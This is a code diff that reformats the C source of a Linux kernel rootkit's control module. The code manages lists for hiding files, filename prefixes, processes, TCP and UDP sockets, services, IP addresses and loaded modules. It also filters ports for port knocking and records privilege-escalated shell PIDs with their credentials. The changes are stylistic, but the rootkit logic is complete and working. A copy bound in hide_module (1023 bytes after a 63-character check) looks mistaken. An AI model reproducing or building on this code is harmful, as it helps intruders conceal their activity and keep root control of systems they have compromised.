@@ -45,25 +45,23 @@ static struct list_head modules;
 static struct list_head port_knocking_enabled;
 static struct list_head escalated_pids;
 
-int
-control_loaded (void)
+int control_loaded(void)
 {
 	return ctrl_loaded;
 }
 
-int
-is_path_hidden (char *name)
+int is_path_hidden(char *name)
 {
 	struct file_name *cur;
 	struct list_head *cursor;
-	
-	if(name == NULL) {
+
+	if (name == NULL) {
 		return 0;
 	}
-		
+
 	list_for_each(cursor, &paths) {
 		cur = list_entry(cursor, struct file_name, list);
-		if(strcmp(cur->name, name) == 0) {
+		if (strcmp(cur->name, name) == 0) {
 			return 1;
 		}
 	}
@@ -71,89 +69,84 @@ is_path_hidden (char *name)
 	return 0;
 }
 
-int
-hide_file_path (char *name)
+int hide_file_path(char *name)
 {
 	struct file_name *new;
 
-	if(!control_loaded())
+	if (!control_loaded())
 		return -EPERM;
 
-	if(strlen(name) > 1023 || is_path_hidden(name))
+	if (strlen(name) > 1023 || is_path_hidden(name))
 		return -EINVAL;
 
 	new = kmalloc(sizeof(struct file_name), GFP_KERNEL);
-	if(new == NULL)
+	if (new == NULL)
 		return -ENOMEM;
-	
+
 	strncpy(new->name, name, 1023);
 
 	list_add(&new->list, &paths);
-	
+
 	return 0;
 }
 
-int
-unhide_file_path (char *name)
+int unhide_file_path(char *name)
 {
 	struct file_name *cur;
 	struct list_head *cursor, *next;
 
-	if(!control_loaded())
+	if (!control_loaded())
 		return -EPERM;
 
 	list_for_each_safe(cursor, next, &paths) {
 		cur = list_entry(cursor, struct file_name, list);
-		if(strcmp(cur->name, name) == 0) {
+		if (strcmp(cur->name, name) == 0) {
 			list_del(cursor);
 			kfree(cur);
 			return 0;
 		}
 	}
-	
+
 	return -EINVAL;
 }
 
-struct list_head *
-get_prefix_list (void)
+struct list_head *get_prefix_list(void)
 {
 	return &prefixes;
 }
 
-int
-is_prefix_hidden (char *name)
+int is_prefix_hidden(char *name)
 {
 	struct file_prefix *cur;
 	struct list_head *cursor;
-	
-	if(name == NULL)
+
+	if (name == NULL)
 		return 0;
-		
+
 	list_for_each(cursor, &prefixes) {
 		cur = list_entry(cursor, struct file_prefix, list);
-		if(strcmp(cur->name, name) == 0)
+		if (strcmp(cur->name, name) == 0)
 			return 1;
 	}
 
 	return 0;
 }
 
-int
-hide_file_prefix (char *name)
+int hide_file_prefix(char *name)
 {
 	struct file_prefix *new;
 
-	if(!control_loaded())
+	if (!control_loaded())
 		return -EPERM;
 
-	if(strlen(name) > 63 || is_prefix_hidden(name))
+	if (strlen(name) > 63 || is_prefix_hidden(name))
 		return -EINVAL;
 
 	new = kmalloc(sizeof(struct file_prefix), GFP_KERNEL);
-	if(new == NULL) {
+	if (new == NULL) {
 		return -ENOMEM;
 	}
-	
+
 	strncpy(new->name, name, 63);
 
 	list_add(&new->list, &prefixes);
@@ -161,18 +154,17 @@ hide_file_prefix (char *name)
 	return 0;
 }
 
-int
-unhide_file_prefix (char *name)
+int unhide_file_prefix(char *name)
 {
 	struct file_prefix *cur;
 	struct list_head *cursor, *next;
 
-	if(!control_loaded())
+	if (!control_loaded())
 		return -EPERM;
 
 	list_for_each_safe(cursor, next, &prefixes) {
 		cur = list_entry(cursor, struct file_prefix, list);
-		if(strcmp(cur->name, name) == 0) {
+		if (strcmp(cur->name, name) == 0) {
 			list_del(cursor);
 			kfree(cur);
 			return 0;
@@ -182,8 +174,7 @@ unhide_file_prefix (char *name)
 	return -EINVAL;
 }
 
-int
-is_process_hidden (pid_t pid)
+int is_process_hidden(pid_t pid)
 {
 	struct process *cur;
 	struct list_head *cursor;
@@ -192,56 +183,54 @@ is_process_hidden (pid_t pid)
 	task = pid_task(find_vpid(pid), PIDTYPE_PID);
 
 	/* sanity check */
-	if(task == NULL)
+	if (task == NULL)
 		return -EINVAL;
 
 	do {
 		list_for_each(cursor, &processes) {
 			cur = list_entry(cursor, struct process, list);
-			if(cur->pid == task->pid)
+			if (cur->pid == task->pid)
 				return 1;
 		}
-		
+
 		task = task->parent;
 	} while (task != NULL && task->pid != 0);
 
 	return 0;
 }
 
-int
-hide_process (pid_t pid)
+int hide_process(pid_t pid)
 {
 	struct process *new;
-	
-	if(!control_loaded())
+
+	if (!control_loaded())
 		return -EPERM;
 
-	if(is_process_hidden(pid) || pid < 0)
+	if (is_process_hidden(pid) || pid < 0)
 		return -EINVAL;
 
 	new = kmalloc(sizeof(struct process), GFP_KERNEL);
-	if(new == NULL)
+	if (new == NULL)
 		return -ENOMEM;
-	
+
 	new->pid = pid;
 
 	list_add(&new->list, &processes);
-	
+
 	return 0;
 }
 
-int
-unhide_process (pid_t pid)
+int unhide_process(pid_t pid)
 {
 	struct process *cur;
 	struct list_head *cursor, *next;
 
-	if(!control_loaded())
+	if (!control_loaded())
 		return -EPERM;
 
 	list_for_each_safe(cursor, next, &processes) {
 		cur = list_entry(cursor, struct process, list);
-		if(cur->pid == pid) {
+		if (cur->pid == pid) {
 			list_del(cursor);
 			kfree(cur);
 			return 0;
@@ -251,55 +240,52 @@ unhide_process (pid_t pid)
 	return -EINVAL;
 }
 
-int
-is_tcp_socket_hidden (int port)
+int is_tcp_socket_hidden(int port)
 {
 	struct tcp_socket *cur;
 	struct list_head *cursor;
-	
+
 	list_for_each(cursor, &tcp_sockets) {
 		cur = list_entry(cursor, struct tcp_socket, list);
-		if(cur->port == port)
+		if (cur->port == port)
 			return 1;
 	}
 
 	return 0;
 }
 
-int
-hide_tcp_socket (int port) 
+int hide_tcp_socket(int port)
 {
 	struct tcp_socket *new;
-	
-	if(!control_loaded())
+
+	if (!control_loaded())
 		return -EPERM;
 
-	if(is_tcp_socket_hidden(port) || port <= 0 || port > 65535)
+	if (is_tcp_socket_hidden(port) || port <= 0 || port > 65535)
 		return -EINVAL;
 
 	new = kmalloc(sizeof(struct tcp_socket), GFP_KERNEL);
-	if(new == NULL)
+	if (new == NULL)
 		return -ENOMEM;
-	
+
 	new->port = port;
 
 	list_add(&new->list, &tcp_sockets);
-	
+
 	return 0;
 }
 
-int
-unhide_tcp_socket (int port)
+int unhide_tcp_socket(int port)
 {
 	struct tcp_socket *cur;
 	struct list_head *cursor, *next;
 
-	if(!control_loaded())
+	if (!control_loaded())
 		return -EPERM;
 
 	list_for_each_safe(cursor, next, &tcp_sockets) {
 		cur = list_entry(cursor, struct tcp_socket, list);
-		if(cur->port == port) {
+		if (cur->port == port) {
 			list_del(cursor);
 			kfree(cur);
 			return 0;
@@ -309,55 +295,52 @@ unhide_tcp_socket (int port)
 	return -EINVAL;
 }
 
-int
-is_udp_socket_hidden (int port)
+int is_udp_socket_hidden(int port)
 {
 	struct udp_socket *cur;
 	struct list_head *cursor;
-	
+
 	list_for_each(cursor, &udp_sockets) {
 		cur = list_entry(cursor, struct udp_socket, list);
-		if(cur->port == port)
+		if (cur->port == port)
 			return 1;
 	}
 
 	return 0;
 }
 
-int
-hide_udp_socket (int port)
+int hide_udp_socket(int port)
 {
 	struct udp_socket *new;
-	
-	if(!control_loaded())
+
+	if (!control_loaded())
 		return -EPERM;
 
-	if(is_udp_socket_hidden(port) || port <= 0 || port > 65535)
+	if (is_udp_socket_hidden(port) || port <= 0 || port > 65535)
 		return -EINVAL;
 
 	new = kmalloc(sizeof(struct udp_socket), GFP_KERNEL);
-	if(new == NULL)
+	if (new == NULL)
 		return -ENOMEM;
-	
+
 	new->port = port;
 
 	list_add(&new->list, &udp_sockets);
-	
+
 	return 0;
 }
 
-int
-unhide_udp_socket (int port)
+int unhide_udp_socket(int port)
 {
 	struct udp_socket *cur;
 	struct list_head *cursor, *next;
 
-	if(!control_loaded())
+	if (!control_loaded())
 		return -EPERM;
 
 	list_for_each_safe(cursor, next, &udp_sockets) {
 		cur = list_entry(cursor, struct udp_socket, list);
-		if(cur->port == port) {
+		if (cur->port == port) {
 			list_del(cursor);
 			kfree(cur);
 			return 0;
@@ -367,55 +350,52 @@ unhide_udp_socket (int port)
 	return -EINVAL;
 }
 
-int
-is_knocked_tcp (int port)
+int is_knocked_tcp(int port)
 {
 	struct knocking_tcp_port *cur;
 	struct list_head *cursor;
-	
+
 	list_for_each(cursor, &knocking_tcp_ports) {
 		cur = list_entry(cursor, struct knocking_tcp_port, list);
-		if(cur->port == port)
+		if (cur->port == port)
 			return 1;
 	}
 
 	return 0;
 }
 
-int
-enable_knocking_tcp (int port) 
+int enable_knocking_tcp(int port)
 {
 	struct knocking_tcp_port *new;
-	
-	if(!control_loaded())
+
+	if (!control_loaded())
 		return -EPERM;
 
-	if(is_knocked_tcp(port) || port <= 0 || port > 65535)
+	if (is_knocked_tcp(port) || port <= 0 || port > 65535)
 		return -EINVAL;
 
 	new = kmalloc(sizeof(struct knocking_tcp_port), GFP_KERNEL);
-	if(new == NULL)
+	if (new == NULL)
 		return -ENOMEM;
-	
+
 	new->port = port;
 
 	list_add(&new->list, &knocking_tcp_ports);
-	
+
 	return 0;
 }
 
-int
-disable_knocking_tcp (int port)
+int disable_knocking_tcp(int port)
 {
 	struct knocking_tcp_port *cur;
 	struct list_head *cursor, *next;
 
-	if(!control_loaded())
+	if (!control_loaded())
 		return -EPERM;
 
 	list_for_each_safe(cursor, next, &knocking_tcp_ports) {
 		cur = list_entry(cursor, struct knocking_tcp_port, list);
-		if(cur->port == port) {
+		if (cur->port == port) {
 			list_del(cursor);
 			kfree(cur);
 			return 0;
@@ -425,58 +405,55 @@ disable_knocking_tcp (int port)
 	return -EINVAL;
 }
 
-int
-is_knocked_udp (int port)
+int is_knocked_udp(int port)
 {
 	struct knocking_udp_port *cur;
 	struct list_head *cursor;
-	
-	if(!control_loaded())
+
+	if (!control_loaded())
 		return -EPERM;
 
 	list_for_each(cursor, &knocking_udp_ports) {
 		cur = list_entry(cursor, struct knocking_udp_port, list);
-		if(cur->port == port)
+		if (cur->port == port)
 			return 1;
 	}
 
 	return 0;
 }
 
-int
-enable_knocking_udp (int port) 
+int enable_knocking_udp(int port)
 {
 	struct knocking_udp_port *new;
-	
-	if(!control_loaded())
+
+	if (!control_loaded())
 		return -EPERM;
 
-	if(is_knocked_udp(port) || port <= 0 || port > 65535)
+	if (is_knocked_udp(port) || port <= 0 || port > 65535)
 		return -EINVAL;
 
 	new = kmalloc(sizeof(struct knocking_udp_port), GFP_KERNEL);
-	if(new == NULL)
+	if (new == NULL)
 		return -ENOMEM;
-	
+
 	new->port = port;
 
 	list_add(&new->list, &knocking_udp_ports);
-	
+
 	return 0;
 }
 
-int
-disable_knocking_udp (int port)
+int disable_knocking_udp(int port)
 {
 	struct knocking_udp_port *cur;
 	struct list_head *cursor, *next;
 
-	if(!control_loaded())
+	if (!control_loaded())
 		return -EPERM;
 
 	list_for_each_safe(cursor, next, &knocking_udp_ports) {
 		cur = list_entry(cursor, struct knocking_udp_port, list);
-		if(cur->port == port) {
+		if (cur->port == port) {
 			list_del(cursor);
 			kfree(cur);
 			return 0;
@@ -486,55 +463,52 @@ disable_knocking_udp (int port)
 	return -EINVAL;
 }
 
-int
-is_service_hidden (int port)
+int is_service_hidden(int port)
 {
 	struct hidden_service *cur;
 	struct list_head *cursor;
-	
+
 	list_for_each(cursor, &hidden_services) {
 		cur = list_entry(cursor, struct hidden_service, list);
-		if(cur->port == port)
+		if (cur->port == port)
 			return 1;
 	}
 
 	return 0;
 }
 
-int
-hide_service (int port) 
+int hide_service(int port)
 {
 	struct hidden_service *new;
-	
-	if(!control_loaded())
+
+	if (!control_loaded())
 		return -EPERM;
 
-	if(is_service_hidden(port) || port <= 0 || port > 65535)
+	if (is_service_hidden(port) || port <= 0 || port > 65535)
 		return -EINVAL;
 
 	new = kmalloc(sizeof(struct hidden_service), GFP_KERNEL);
-	if(new == NULL)
+	if (new == NULL)
 		return -ENOMEM;
-	
+
 	new->port = port;
 
 	list_add(&new->list, &hidden_services);
-	
+
 	return 0;
 }
 
-int
-unhide_service (int port)
+int unhide_service(int port)
 {
 	struct hidden_service *cur;
 	struct list_head *cursor, *next;
-	
-	if(!control_loaded())
+
+	if (!control_loaded())
 		return -EPERM;
 
 	list_for_each_safe(cursor, next, &hidden_services) {
 		cur = list_entry(cursor, struct hidden_service, list);
-		if(cur->port == port) {
+		if (cur->port == port) {
 			list_del(cursor);
 			kfree(cur);
 			return 0;
@@ -544,55 +518,52 @@ unhide_service (int port)
 	return -EINVAL;
 }
 
-int
-is_ip_hidden (__u32 ipaddr)
+int is_ip_hidden(__u32 ipaddr)
 {
 	struct hidden_ip *cur;
 	struct list_head *cursor;
-	
+
 	list_for_each(cursor, &hidden_ips) {
 		cur = list_entry(cursor, struct hidden_ip, list);
-		if(cur->ipaddr == ipaddr)
+		if (cur->ipaddr == ipaddr)
 			return 1;
 	}
 
 	return 0;
 }
 
-int
-hide_ip_address (__u32 ipaddr)
+int hide_ip_address(__u32 ipaddr)
 {
 	struct hidden_ip *new;
-	
-	if(!control_loaded())
+
+	if (!control_loaded())
 		return -EPERM;
 
-	if(is_ip_hidden(ipaddr))
+	if (is_ip_hidden(ipaddr))
 		return -EINVAL;
 
 	new = kmalloc(sizeof(struct hidden_ip), GFP_KERNEL);
-	if(new == NULL)
+	if (new == NULL)
 		return -ENOMEM;
-	
+
 	new->ipaddr = ipaddr;
 
 	list_add(&new->list, &hidden_ips);
-	
+
 	return 0;
 }
 
-int
-unhide_ip_address (__u32 ipaddr)
+int unhide_ip_address(__u32 ipaddr)
 {
 	struct hidden_ip *cur;
 	struct list_head *cursor, *next;
 
-	if(!control_loaded())
+	if (!control_loaded())
 		return -EPERM;
 
 	list_for_each_safe(cursor, next, &hidden_ips) {
 		cur = list_entry(cursor, struct hidden_ip, list);
-		if(cur->ipaddr == ipaddr) {
+		if (cur->ipaddr == ipaddr) {
 			list_del(cursor);
 			kfree(cur);
 			return 0;
@@ -602,58 +573,55 @@ unhide_ip_address (__u32 ipaddr)
 	return -EINVAL;
 }
 
-int
-is_module_hidden (char *name)
+int is_module_hidden(char *name)
 {
 	struct modules *cur;
 	struct list_head *cursor;
-	
-	if(name == NULL)
+
+	if (name == NULL)
 		return 0;
-		
+
 	list_for_each(cursor, &modules) {
 		cur = list_entry(cursor, struct modules, list);
-		if(strcmp(cur->name, name) == 0)
+		if (strcmp(cur->name, name) == 0)
 			return 1;
 	}
 
 	return 0;
 }
 
-int
-hide_module (char *name)
+int hide_module(char *name)
 {
 	struct modules *new;
 
-	if(!control_loaded())
+	if (!control_loaded())
 		return -EPERM;
 
-	if(strlen(name) > 63 || is_module_hidden(name))
+	if (strlen(name) > 63 || is_module_hidden(name))
 		return -EINVAL;
-	
+
 	new = kmalloc(sizeof(struct modules), GFP_KERNEL);
-	if(new == NULL)
+	if (new == NULL)
 		return -ENOMEM;
-	
+
 	strncpy(new->name, name, 1023);
 
 	list_add(&new->list, &modules);
-	
+
 	return 0;
 }
 
-int
-unhide_module (char *name)
+int unhide_module(char *name)
 {
 	struct modules *cur;
 	struct list_head *cursor, *next;
 
-	if(!control_loaded())
+	if (!control_loaded())
 		return -EPERM;
 
 	list_for_each_safe(cursor, next, &modules) {
 		cur = list_entry(cursor, struct modules, list);
-		if(strcmp(cur->name, name) == 0) {
+		if (strcmp(cur->name, name) == 0) {
 			list_del(cursor);
 			kfree(cur);
 			return 0;
@@ -663,65 +631,60 @@ unhide_module (char *name)
 	return -EINVAL;
 }
 
-int
-is_port_filtered (int port, int protocol, int ipaddr)
+int is_port_filtered(int port, int protocol, int ipaddr)
 {
 	struct port_knocking *cur;
 	struct list_head *cursor;
 
 	list_for_each(cursor, &port_knocking_enabled) {
 		cur = list_entry(cursor, struct port_knocking, list);
-		
+
 		/* if port and protocol match (but not ipaddr), filter it */
-		if(cur->port == port
-			&& cur->protocol == protocol
-			&& cur->ipaddr != ipaddr)
+		if (cur->port == port
+		    && cur->protocol == protocol && cur->ipaddr != ipaddr)
 			return 1;
 	}
 
 	return 0;
 }
 
-int
-filter_port (int port, int protocol, __u32 ipaddr)
+int filter_port(int port, int protocol, __u32 ipaddr)
 {
 	struct port_knocking *new;
-	
-	if(!control_loaded())
+
+	if (!control_loaded())
 		return -EPERM;
 
-	if(ipaddr == 0x00000000)	/* illegal/reserved ipaddr */
+	if (ipaddr == 0x00000000)	/* illegal/reserved ipaddr */
 		return -EINVAL;
-	
-	if(is_port_filtered(port, protocol, 0x00000000))
+
+	if (is_port_filtered(port, protocol, 0x00000000))
 		return -EINVAL;
 
 	new = kmalloc(sizeof(struct port_knocking), GFP_KERNEL);
-	if(new == NULL)
+	if (new == NULL)
 		return -ENOMEM;
-	
+
 	new->port = port;
 	new->protocol = protocol;
 	new->ipaddr = ipaddr;
 
 	list_add(&new->list, &port_knocking_enabled);
-	
+
 	return 0;
 }
 
-int
-unfilter_port (int port, int protocol)
+int unfilter_port(int port, int protocol)
 {
 	struct port_knocking *cur;
 	struct list_head *cursor, *next;
 
-	if(!control_loaded())
+	if (!control_loaded())
 		return -EPERM;
 
 	list_for_each_safe(cursor, next, &port_knocking_enabled) {
 		cur = list_entry(cursor, struct port_knocking, list);
-		if(cur->port == port
-			&& cur->protocol == protocol) {
+		if (cur->port == port && cur->protocol == protocol) {
 			list_del(cursor);
 			kfree(cur);
 			return 0;
@@ -731,49 +694,47 @@ unfilter_port (int port, int protocol)
 	return -EINVAL;
 }
 
-struct escalated_pid *
-is_shell_escalated (pid_t pid)
+struct escalated_pid *is_shell_escalated(pid_t pid)
 {
 	struct escalated_pid *cur;
 	struct list_head *cursor;
 
-	if(pid == 0)
+	if (pid == 0)
 		return NULL;
 
 	list_for_each(cursor, &escalated_pids) {
 		cur = list_entry(cursor, struct escalated_pid, list);
-		if(cur->pid == pid)
+		if (cur->pid == pid)
 			return cur;
 	}
 
 	return NULL;
 }
 
-int 
-escalate (struct escalated_pid *id)
+int escalate(struct escalated_pid *id)
 {
 	struct escalated_pid *new;
-	
-	if(!control_loaded())
+
+	if (!control_loaded())
 		return -EPERM;
 
-	if(!is_shell_escalated(id->pid)) {
+	if (!is_shell_escalated(id->pid)) {
 		new = kmalloc(sizeof(struct escalated_pid), GFP_KERNEL);
-		
-		if(new == NULL)
+
+		if (new == NULL)
 			return -ENOMEM;
-		
+
 		new->pid = id->pid;
-		
-		new->uid   = id->uid;
-		new->euid  = id->euid;
-		new->suid  = id->suid;
+
+		new->uid = id->uid;
+		new->euid = id->euid;
+		new->suid = id->suid;
 		new->fsuid = id->fsuid;
-		new->gid   = id->gid;
-		new->egid  = id->egid;
-		new->sgid  = id->sgid;
+		new->gid = id->gid;
+		new->egid = id->egid;
+		new->sgid = id->sgid;
 		new->fsgid = id->fsgid;
-		
+
 		list_add(&new->list, &escalated_pids);
 	} else
 		return -EINVAL;
@@ -781,18 +742,17 @@ escalate (struct escalated_pid *id)
 	return 0;
 }
 
-int 
-deescalate (pid_t pid)
+int deescalate(pid_t pid)
 {
 	struct escalated_pid *cur;
 	struct list_head *cursor, *next;
-	
-	if(!control_loaded())
+
+	if (!control_loaded())
 		return -EPERM;
 
 	list_for_each_safe(cursor, next, &escalated_pids) {
 		cur = list_entry(cursor, struct escalated_pid, list);
-		if(cur->pid == pid) {
+		if (cur->pid == pid) {
 			list_del(cursor);
 			kfree(cur);
 			return 0;
@@ -802,8 +762,7 @@ deescalate (pid_t pid)
 	return -EINVAL;
 }
 
-void
-initialize_control (void)
+void initialize_control(void)
 {
 	ROOTKIT_DEBUG("Initializing control datastructures...\n");
 
@@ -821,12 +780,11 @@ initialize_control (void)
 	INIT_LIST_HEAD(&escalated_pids);
 
 	ctrl_loaded = 1;
-	
+
 	ROOTKIT_DEBUG("Done.\n");
 }
 
-void
-cleanup_control(void)
+void cleanup_control(void)
 {
 	ROOTKIT_DEBUG("Cleaning up control datastructures...\n");
 
@@ -843,86 +801,86 @@ cleanup_control(void)
 	struct modules *module;
 	struct port_knocking *knocked_port;
 	struct escalated_pid *esc_pid;
-	
+
 	ctrl_loaded = 0;
-	
+
 	cursor = next = NULL;
 	list_for_each_safe(cursor, next, &paths) {
 		name = list_entry(cursor, struct file_name, list);
 		list_del(cursor);
 		kfree(name);
 	}
-	
+
 	cursor = next = NULL;
 	list_for_each_safe(cursor, next, &prefixes) {
 		prefix = list_entry(cursor, struct file_prefix, list);
 		list_del(cursor);
 		kfree(prefix);
 	}
-	
+
 	cursor = next = NULL;
 	list_for_each_safe(cursor, next, &processes) {
 		process = list_entry(cursor, struct process, list);
 		list_del(cursor);
 		kfree(process);
 	}
-	
+
 	cursor = next = NULL;
 	list_for_each_safe(cursor, next, &tcp_sockets) {
 		tcp = list_entry(cursor, struct tcp_socket, list);
 		list_del(cursor);
 		kfree(tcp);
 	}
-	
+
 	cursor = next = NULL;
 	list_for_each_safe(cursor, next, &udp_sockets) {
 		udp = list_entry(cursor, struct udp_socket, list);
 		list_del(cursor);
 		kfree(udp);
 	}
-	
+
 	cursor = next = NULL;
 	list_for_each_safe(cursor, next, &knocking_tcp_ports) {
 		tcp_knock = list_entry(cursor, struct knocking_tcp_port, list);
 		list_del(cursor);
 		kfree(tcp_knock);
 	}
-	
+
 	cursor = next = NULL;
 	list_for_each_safe(cursor, next, &knocking_udp_ports) {
 		udp_knock = list_entry(cursor, struct knocking_udp_port, list);
 		list_del(cursor);
 		kfree(udp_knock);
 	}
-	
+
 	cursor = next = NULL;
 	list_for_each_safe(cursor, next, &hidden_services) {
 		service = list_entry(cursor, struct hidden_service, list);
 		list_del(cursor);
 		kfree(service);
 	}
-	
+
 	cursor = next = NULL;
 	list_for_each_safe(cursor, next, &hidden_ips) {
 		ip = list_entry(cursor, struct hidden_ip, list);
 		list_del(cursor);
 		kfree(ip);
 	}
-	
+
 	cursor = next = NULL;
 	list_for_each_safe(cursor, next, &modules) {
 		module = list_entry(cursor, struct modules, list);
 		list_del(cursor);
 		kfree(module);
 	}
-	
+
 	cursor = next = NULL;
 	list_for_each_safe(cursor, next, &port_knocking_enabled) {
 		knocked_port = list_entry(cursor, struct port_knocking, list);
 		list_del(cursor);
 		kfree(knocked_port);
 	}
-	
+
 	cursor = next = NULL;
 	list_for_each_safe(cursor, next, &escalated_pids) {
 		esc_pid = list_entry(cursor, struct escalated_pid, list);
